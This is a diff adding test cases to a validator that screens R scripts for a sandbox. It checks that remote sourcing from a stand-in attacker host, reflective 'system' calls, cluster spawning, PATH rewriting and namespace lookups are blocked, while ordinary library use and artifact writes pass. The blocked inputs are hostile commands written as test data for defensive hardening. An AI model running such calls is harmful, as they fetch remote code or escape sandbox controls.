@@ -54,4 +54,21 @@ describe("validateRScript", () => {
     expect(result.ok).toBe(false);
     expect(result.blockedCalls).toContain("shell.exec");
   });
+
+  it.each([
+    ['source("https://evil.example/x.R")'],
+    ['match.fun("system")("cmd")'],
+    ['makeCluster(2, type = "PSOCK")'],
+    ['Sys.setenv(PATH = "/evil")'],
+    ['getFromNamespace("system", "base")'],
+  ])("blocks the hardened reflection/network/escape call: %s", (code) => {
+    expect(validateRScript(code).ok).toBe(false);
+  });
+
+  it.each([
+    ["library(ggplot2)\nwrite.csv(df, artifact_path('out.csv'))"],
+    ["saveRDS(fit, artifact_path('model.rds'))"],
+  ])("keeps legitimate library / artifact writes allowed: %s", (code) => {
+    expect(validateRScript(code).ok).toBe(true);
+  });
 });
